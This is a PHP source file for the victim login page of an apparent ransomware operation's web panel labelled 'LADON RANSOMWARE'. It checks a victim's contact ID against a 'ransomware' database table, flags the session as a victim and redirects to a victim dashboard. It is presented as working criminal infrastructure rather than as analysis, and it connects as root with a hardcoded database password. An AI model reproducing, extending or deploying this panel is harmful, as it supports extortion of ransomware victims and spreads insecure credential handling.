<?php
    session_start();
    $dsn = 'mysql:host=localhost;dbname=db';
    $username = 'root'; 
    $pwd='e60603519ea0D$'; 
    try {
        $db = new PDO($dsn, $username, $pwd);
    }
    catch (PDOException $e) {
        $error_message = $e->getMessage();
        echo "error";
        
    }
if(!empty($_POST['contactid'])){
    $contactid = $_POST['contactid'];
    $statement = "SELECT * FROM `ransomware` WHERE `contactid` = :contactid ";
    if($sth = $db->prepare($statement)){
    $sth->bindParam(':contactid', $contactid);
    $sth->execute();
    if($sth->rowCount() > 0){
        $_SESSION['victim'] = $contactid;
        header("Location: victimindex.php");
        die("x");
    }
}
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>LADON RANSOMWARE</title>


        <!-- Theme Css -->
        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section class="login">
            <div class="container">
                <div class="row">
                    <div class="col-lg-12 col-sm-12">
                        <div class="wrapper-page">
                            <div class="account-pages">
                                <div class="account-box">
                                    <div class="card m-b-30">
                                        <div class="card-body">
                                            <div class="card-title text-center">
                                                <h5 class="mt-3"><b>Login With Contact ID</b></h5>
                                            </div> 
                                            
                                            <form class="form mt-5 contact-form" method="POST">
                                                
                                                <div class="form-group ">
                                                    <div class="col-sm-12">
                                                        <input class="form-control form-control-line" type="contactid" placeholder="contactid" required="required" name="contactid">
                                                    </div>
                                                </div>

                                                
                                                <div class="form-group">
                                                    <div class="col-sm-12 mt-4">
                                                        <button class="btn btn-primary btn-block" type="submit">Login</button>
                                                    </div>
                                                </div>

                                            </form>
                                        </div>
                                        <center>
                                        <span>
                                                If you are wondering why you are here, click the button below  <a class="btn btn-primary" type="submit" href="readmore.php"> Read More</a>
                                            </span>
                                        </center>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

       
        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

    </body>
</html>
